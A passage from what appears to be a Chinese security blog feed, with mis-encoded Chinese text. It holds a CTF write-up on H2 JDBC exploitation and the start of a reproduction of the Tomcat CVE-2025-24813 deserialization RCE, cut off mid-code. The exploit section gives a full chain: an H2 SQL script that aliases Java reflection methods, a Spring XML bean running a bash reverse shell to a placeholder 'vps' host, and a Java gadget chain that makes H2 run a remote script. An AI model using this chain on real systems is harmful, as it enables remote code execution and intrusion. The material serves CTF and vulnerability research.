é™¤ï¼Œè€Œä¸”è¿™é“é¢˜æœ‰ç‚¹æŠ½è±¡çš„ç”¨äº†JREï¼Œè€Œä¸æ˜¯å®Œæ•´çš„JDKç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰javacï¼Œæ²¡æ³•ç»™ä½ ç¼–è¯‘äº†ï¼Œé‚£ä¹ˆåˆ›å»ºæ¶æ„å‡½æ•°çš„æ–¹æ³•å°±å¯„äº†ã€‚</p><p>ä½†æ˜¯ä½ å¦‚æœç¿»çœ‹H2å®˜æ–¹æ–‡æ¡£ï¼Œä¼šå‘ç°CERATE ALIASé™¤äº†èƒ½åœ¨sqlæ‰§è¡Œçš„æ—¶å€™åˆ›å»ºæ¶æ„å‡½æ•°ï¼Œè¿˜å¯ä»¥ç›´æ¥å¼•ç”¨å·²çŸ¥çš„Javaæ–¹æ³•ï¼Œå…¨ç¨‹æ²¡æœ‰javacçš„å‚åŠ ã€‚</p><p><a href="https://h2database.com/html/features.html">Features</a>ï¼š</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331172209936.png" alt="image-20250331172209936"></p><p>ä¸€ä¸‹å°±å˜æˆæ¼æ´æŒ–æ˜äº†å‘¢ã€‚åªè¦æ˜¯æˆ‘ä»¬èƒ½æ‰¾åˆ°ä¾èµ–ä¸­çš„ç¬¦åˆæ¡ä»¶çš„é™æ€æ–¹æ³•å°±èƒ½Räº†ã€‚</p><p>è¿™é‡Œçš„æ‰“æ³•åƒå¥‡ç™¾æ€ªäº†ï¼Œå› ä¸ºæ–¹æ³•æœ‰å¾ˆå¤šï¼ŒX1å“¥ç”¨çš„Springçš„<code>ReflectUtils</code>åå°„è°ƒç”¨<code>ClassPathXmlApplicationContext</code>çš„æ„é€ æ–¹æ³•ï¼Œä½†æ˜¯ç›´æ¥æ‰§è¡ŒSQLè¯­å¥ä¼šæŠ¥é”™ä¸æ”¯æŒJAVA_OBJECT ä¸VARCHAR(CHARACTER VARYING)ç±»å‹ä¹‹é—´çš„è½¬æ¢ï¼š<a href="https://github.com/h2database/h2database/issues/3389">Data conversion error converting â€œJAVA_OBJECT, CHARACTER VARYINGâ€ Â· Issue #3389 Â· h2database&#x2F;h2database</a></p><p>å› ä¸º<code>ReflectUtils.newInstance</code>ä¼ å…¥çš„argså‚æ•°æ˜¯Objectç±»å‹ï¼Œsqlæ–‡ä»¶ä¸­çš„<code>@url_str</code>å±äºVARCHARç±»å‹ã€‚</p><p>æ‰€ä»¥å¿…é¡»æ‰¾åˆ°ä¸€ä¸ªå‚æ•°ç±»å‹ä¸ºObjectä¸”è¿”å›å€¼æ˜¯Stringç±»å‹çš„staticæ–¹æ³•ï¼Œä»è€Œé—´æ¥åœ°å®ç°ç±»å‹çš„è½¬æ¢ï¼Œè¿™é‡Œç”±äºæˆ‘è¿˜æ²¡è£…CodeQLå’ŒTabbyï¼Œæ‰€ä»¥å°±ä¸å»æ‰‹åŠ¨æ‰¾äº†ã€‚è¿™ä¿©å¯¹Javachainsçš„æŒ–æ˜å¾ˆæœ‰å¸®åŠ©ï¼Œåé¢æœ‰ç¼˜æ­å»ºä¸€ä¸‹å†æ›´å§hhhã€‚</p><p>X1å“¥ç”¨çš„<code>javax.naming.ldap.Rdn.unescapeValue</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unescapeValue</span><span class="hljs-params">(String val)</span> &#123;<br><br>            <span class="hljs-type">char</span>[] chars = val.toCharArray();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">beg</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> chars.length;<br><br>            <span class="hljs-comment">// Trim off leading and trailing whitespace.</span><br>            <span class="hljs-keyword">while</span> ((beg &lt; end) &amp;&amp; isWhitespace(chars[beg])) &#123;<br>                ++beg;<br>            &#125;<br><br>            <span class="hljs-keyword">while</span> ((beg &lt; end) &amp;&amp; isWhitespace(chars[end - <span class="hljs-number">1</span>])) &#123;<br>                --end;<br>            &#125;<br><br>            <span class="hljs-comment">// Add back the trailing whitespace with a preceding &#x27;\&#x27;</span><br>            <span class="hljs-comment">// (escaped or unescaped) that was taken off in the above</span><br>            <span class="hljs-comment">// loop. Whether or not to retain this whitespace is decided below.</span><br>            <span class="hljs-keyword">if</span> (end != chars.length &amp;&amp;<br>                    (beg &lt; end) &amp;&amp;<br>                    chars[end - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\\&#x27;</span>) &#123;<br>                end++;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (beg &gt;= end) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (chars[beg] == <span class="hljs-string">&#x27;#&#x27;</span>) &#123;<br>                <span class="hljs-comment">// Value is binary (eg: &quot;#CEB1DF80&quot;).</span><br>                <span class="hljs-keyword">return</span> decodeHexPairs(chars, ++beg, end);<br>            &#125;<br><br>            <span class="hljs-comment">// Trim off quotes.</span><br>            <span class="hljs-keyword">if</span> ((chars[beg] == <span class="hljs-string">&#x27;\&quot;&#x27;</span>) &amp;&amp; (chars[end - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;\&quot;&#x27;</span>)) &#123;<br>                ++beg;<br>                --end;<br>            &#125;<br><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(end - beg);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">esc</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">// index of the last escaped character</span><br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> beg; i &lt; end; i++) &#123;<br>                <span class="hljs-keyword">if</span> ((chars[i] == <span class="hljs-string">&#x27;\\&#x27;</span>) &amp;&amp; (i + <span class="hljs-number">1</span> &lt; end)) &#123;<br>                    <span class="hljs-keyword">if</span> (!Character.isLetterOrDigit(chars[i + <span class="hljs-number">1</span>])) &#123;<br>                        ++i;                            <span class="hljs-comment">// skip backslash</span><br>                        builder.append(chars[i]);       <span class="hljs-comment">// snarf escaped char</span><br>                        esc = i;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>                        <span class="hljs-comment">// Convert hex-encoded UTF-8 to 16-bit chars.</span><br>                        <span class="hljs-type">byte</span>[] utf8 = getUtf8Octets(chars, i, end);<br>                        <span class="hljs-keyword">if</span> (utf8.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">try</span> &#123;<br>                                builder.append(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(utf8, <span class="hljs-string">&quot;UTF8&quot;</span>));<br>                            &#125; <span class="hljs-keyword">catch</span> (java.io.UnsupportedEncodingException e) &#123;<br>                                <span class="hljs-comment">// shouldn&#x27;t happen</span><br>                            &#125;<br>                            i += utf8.length * <span class="hljs-number">3</span> - <span class="hljs-number">1</span>;<br>                        &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// no utf8 bytes available, invalid DN</span><br><br>                            <span class="hljs-comment">// &#x27;/&#x27; has no meaning, throw exception</span><br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<br>                                <span class="hljs-string">&quot;Not a valid attribute string value:&quot;</span> +<br>                                val + <span class="hljs-string">&quot;,improper usage of backslash&quot;</span>);<br>                        &#125;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    builder.append(chars[i]);   <span class="hljs-comment">// snarf unescaped char</span><br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// Get rid of the unescaped trailing whitespace with the</span><br>            <span class="hljs-comment">// preceding &#x27;\&#x27; character that was previously added back.</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> builder.length();<br>            <span class="hljs-keyword">if</span> (isWhitespace(builder.charAt(len - <span class="hljs-number">1</span>)) &amp;&amp; esc != (end - <span class="hljs-number">1</span>)) &#123;<br>                builder.setLength(len - <span class="hljs-number">1</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span> builder.toString();<br>        &#125;<br></code></pre></td></tr></table></figure><p>å°±è¿èµ·æ¥äº†ã€‚</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>sqlæ–‡ä»¶ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS CLASS_FOR_NAME <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;java.lang.Class.forName(java.lang.String)&#x27;</span>;<br><span class="hljs-keyword">CREATE</span> ALIAS NEW_INSTANCE <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;org.springframework.cglib.core.ReflectUtils.newInstance(java.lang.Class, java.lang.Class[], java.lang.Object[])&#x27;</span>;<br><span class="hljs-keyword">CREATE</span> ALIAS UNESCAPE_VALUE <span class="hljs-keyword">FOR</span> <span class="hljs-string">&#x27;javax.naming.ldap.Rdn.unescapeValue(java.lang.String)&#x27;</span>;<br><br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@url_str</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;http://vps:port/h2_revenge_evil.xml&#x27;</span>;<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@url_obj</span><span class="hljs-operator">=</span>UNESCAPE_VALUE(<span class="hljs-variable">@url_str</span>);<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@context_clazz</span><span class="hljs-operator">=</span>CLASS_FOR_NAME(<span class="hljs-string">&#x27;org.springframework.context.support.ClassPathXmlApplicationContext&#x27;</span>);<br><span class="hljs-keyword">SET</span> <span class="hljs-variable">@string_clazz</span><span class="hljs-operator">=</span>CLASS_FOR_NAME(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>);<br><br><span class="hljs-keyword">CALL</span> NEW_INSTANCE(<span class="hljs-variable">@context_clazz</span>, <span class="hljs-keyword">ARRAY</span>[<span class="hljs-variable">@string_clazz</span>], <span class="hljs-keyword">ARRAY</span>[<span class="hljs-variable">@url_obj</span>]);<br></code></pre></td></tr></table></figure><p>xmlæ–‡ä»¶ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><br><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Exp.javaï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br><br><br>        UnsafeUtil.patchModule(Exp.class);<br>        UnsafeUtil.patchModule(ReflectUtil.class);<br><br>        <span class="hljs-type">MyDataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDataSource</span>(<span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://vps:port/h2_revenge_poc.sql&#x27;&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>, <span class="hljs-string">&quot;bbb&quot;</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojoNode</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(dataSource);<br><br>        <span class="hljs-type">EventListenerList</span> <span class="hljs-variable">eventListenerList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventListenerList</span>();<br>        <span class="hljs-type">UndoManager</span> <span class="hljs-variable">undoManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UndoManager</span>();<br>        <span class="hljs-type">Vector</span> <span class="hljs-variable">vector</span> <span class="hljs-operator">=</span> (Vector) ReflectUtil.getFieldValue(CompoundEdit.class, undoManager, <span class="hljs-string">&quot;edits&quot;</span>);<br>        vector.add(pojoNode);<br><br>        ReflectUtil.setFieldValue(eventListenerList, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;InternalError.class, undoManager&#125;);<br><br>        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(eventListenerList)));<br>        <span class="hljs-comment">//SerializeUtil.test(eventListenerList);</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®°å¾—åŠ VM Optionsã€‚</p><p><img src="/2025/03/31/%E6%9D%A5%E8%87%AA%E4%B8%89%E9%81%93%E9%AB%98%E7%89%88%E6%9C%ACJDK%E7%9A%84JDBC%E8%BF%9E%E6%89%93combo/image-20250331173419158.png" alt="image-20250331173419158"></p><p>å½“ç„¶ï¼Œä¹Ÿæœ‰é‚£ç§æ‰“åå…­è¿›åˆ¶å†™å…¥soæ–‡ä»¶ç„¶ååœ¨sqlæ–‡ä»¶ä¸­æ‰“<code>java.lang.System.load</code>çš„ï¼š<a href="https://blog.csdn.net/Err0r233/article/details/146484415">NCTF2024 Webæ–¹å‘é¢˜è§£-CSDNåšå®¢</a></p><p>è¿™ä¹Ÿæ˜¯æ‰“H2 JDBCçš„ä¸€ç§å¸¸ç”¨æ–¹æ³•ã€‚</p><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>JDKé«˜ç‰ˆæœ¬è¿˜æ˜¯å¤ªå®‰å…¨äº†ï¼Œå®‰å…¨åˆ°åŸºæœ¬å°±åªæœ‰å‡ºéš¾é¢˜å‡ºJDBCé¢˜çš„ä»½äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 Tomcat_RCEå¤ç°</title>
    <link href="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™ä¸ªæ´ä¹Ÿæ˜¯æœ€è¿‘åˆšæŠ«éœ²å°±ç«èµ·æ¥äº†ï¼Œå› ä¸ºç¡®å®éƒ½æ˜¯è€ç”Ÿå¸¸è°ˆçš„æ´ï¼Œè§¦å‘æ¡ä»¶éƒ½æ˜¯ä»¥å‰çš„CVEã€‚</p><p>å½“ç„¶æˆ‘æ˜¯ä¸ºäº†é€ƒé¿æœ€è¿‘çš„paperç»„çš„å‹åŠ›ï¼Œæ„Ÿè§‰é‚£è¾¹çš„äº‹æ°¸è¿œéƒ½åšä¸å®Œemmmmmï¼Œæ­å®Œé‚£è¾¹çš„æ”»å‡»ç¯å¢ƒå°±é©¬ä¸Šæ¶¦æ¥å¤ç°ä¸€ä¸‹è¿™ä¸ªç©æ„äº†ã€‚</p><p>å˜»å˜»ã€‚</p><h1 id="è§¦å‘æ¡ä»¶åŠåˆ©ç”¨èŒƒå›´"><a href="#è§¦å‘æ¡ä»¶åŠåˆ©ç”¨èŒƒå›´" class="headerlink" title="è§¦å‘æ¡ä»¶åŠåˆ©ç”¨èŒƒå›´"></a>è§¦å‘æ¡ä»¶åŠåˆ©ç”¨èŒƒå›´</h1><p>å…¶å®å°±æ˜¯å‡ ä¸ªCVEçš„ç¼åˆï¼š</p><ul><li>CVE-2017-12615 Tomcat PUT æ–‡ä»¶ä¸Šä¼ </li><li>CVE-2020-9484ï¼šTomcat Session ååºåˆ—åŒ–æ¼æ´</li><li>CVE-2024-50379 ï¼šTomcat PUT æ¡ä»¶ç«äº‰æ–‡ä»¶ä¸Šä¼ </li></ul><p>tomcatçš„æ¼æ´ç‰ˆæœ¬ï¼š</p><ul><li>9.0.0.M1 &lt;&#x3D; tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; tomcat &lt;&#x3D; 11.0.2</li></ul><p>æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯é»˜è®¤<code>servlet</code>åœ¨å¯ç”¨å†™å…¥çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç‰¹å®šç›®å½•ä¸‹å†™å…¥ä»»æ„æ–‡ä»¶åçš„æ–‡ä»¶ã€‚ç»“åˆTomcatçš„ä¸´æ—¶sessionä¼šè¯æ–‡ä»¶å­˜å‚¨åŠŸèƒ½ï¼Œå¯ä»¥å®ç°ååºåˆ—åŒ–RCEï¼Œåˆ©ç”¨éœ€è¦æ»¡è¶³ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€å¯ç”¨DefaultServletå†™å…¥ï¼Œæ”¯æŒPUTè¯·æ±‚ï¼›<br><span class="hljs-number">2</span>ã€å¼€å¯äº†Tomcatä¼šè¯ï¼Œå¹¶ä¸”ä½¿ç”¨äº†é»˜è®¤çš„ä¼šè¯å­˜å‚¨ä½ç½®ï¼›<br><span class="hljs-number">3</span>ã€ç±»è·¯å¾„ä¸‹éœ€è¦å­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨é“¾çš„åº“ä¾èµ–åº“ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¤ç°ç”¨çš„æ˜¯<strong>tomcat9.0.96</strong>ã€‚ï¼ˆå› ä¸ºä¸æƒ³é…é«˜ç‰ˆæœ¬äº†hhhï¼Œå·ä¸ªæ‡’æ‹¿æœ¬æœºä¸Šçš„ç›´æ¥ç”¨äº†ï¼‰</p><h1 id="CVEå¤ç°"><a href="#CVEå¤ç°" class="headerlink" title="CVEå¤ç°"></a>CVEå¤ç°</h1><h2 id="æ¼æ´åˆ©ç”¨å‰ç½®é…æ–¹"><a href="#æ¼æ´åˆ©ç”¨å‰ç½®é…æ–¹" class="headerlink" title="æ¼æ´åˆ©ç”¨å‰ç½®é…æ–¹"></a>æ¼æ´åˆ©ç”¨å‰ç½®é…æ–¹</h2><p>æŒ‰ç…§å¤ç°çš„æ€è·¯ï¼Œæˆ‘ä»¬å…ˆå¼€è¿™ä¸ªsessionå­˜å‚¨å§ï¼Œåœ¨conf&#x2F;context.xmlå¢åŠ ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¸œè¥¿å¼€å¯çš„æ•ˆæœå°±æ˜¯ä¸å¸¦cookieè®¿é—®tomcatï¼Œç„¶ååœæ­¢tomcatï¼Œã€.1.txtã€‘åŒç›®å½•ä¼šç”Ÿæˆåºåˆ—åŒ–ä¿å­˜çš„sessionæ–‡ä»¶ã€‚</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315173552019.png" alt="image-20250315173552019"></p><p>ä½†ä»–åªä¼šçŸ­æš‚å­˜åœ¨ä¸ªåå‡ ç§’ï¼Œç„¶åå°±æ²¡äº†ã€‚</p><p>ç„¶ååœ¨conf&#x2F;web.xmlæ–‡ä»¶çš„<code>DefaultServlet</code>éƒ¨åˆ†æ’å…¥ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç”±æ­¤å¯ç”¨å®ƒçš„PUTåŠŸèƒ½ã€‚</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315164931046.png" alt="image-20250315164931046"></p><p>æ¥ç€å°±æ˜¯ååºåˆ—åŒ–æ¼æ´ä¾èµ–äº†ï¼Œä¸å¼„å¤æ‚äº†ï¼Œå°±CCé“¾å§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o http://gitlab.53site.com/shuzhan/oss/-/raw/master/lib/commons-collections-3.2.1.jar?ref_type=heads<br></code></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªåŒ…æ”¾åˆ°tomcatçš„<code>webapps\ROOT\WEB-INF\lib</code>ä¸‹ï¼Œæ²¡libæ–‡ä»¶å¤¹çš„åˆ›ä¸€ä¸ªå°±è¡Œäº†ï¼š</p><p>ç„¶åç›´æ¥startupï¼Œtomcatå¯åŠ¨ï¼ï¼ï¼ï¼</p><h2 id="ååºåˆ—åŒ–å¤ç°"><a href="#ååºåˆ—åŒ–å¤ç°" class="headerlink" title="ååºåˆ—åŒ–å¤ç°"></a>ååºåˆ—åŒ–å¤ç°</h2><p>å…ˆæµ‹æµ‹PUTï¼š</p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315165635833.png" alt="image-20250315165635833"></p><p><img src="/2025/03/15/Tomcat-RCE%E5%A4%8D%E7%8E%B0/image-20250315165650728.png" alt="image-20250315165650728"></p><p>æ²¡é—®é¢˜ã€‚</p><p>å¯¹äº<a href="https://github.com/masahiro331/CVE-2020-9484">masahiro331&#x2F;CVE-2020-9484</a>ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå‡å®šç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ª<code>/tmp/xxx.session</code>æ–‡ä»¶ï¼Œå°±å¯ä»¥é€šè¿‡Cookieæ¥è§¦å‘<code>xxx.session</code>çš„ååºåˆ—åŒ–ã€‚</p><p>å¯¹äºè¿™é‡Œçš„æ¼æ´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨è¯·æ±‚å¤´åŠ ä¸Š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Content-Range: bytes <span class="hljs-number">0</span>-payloadé•¿åº¦/<span 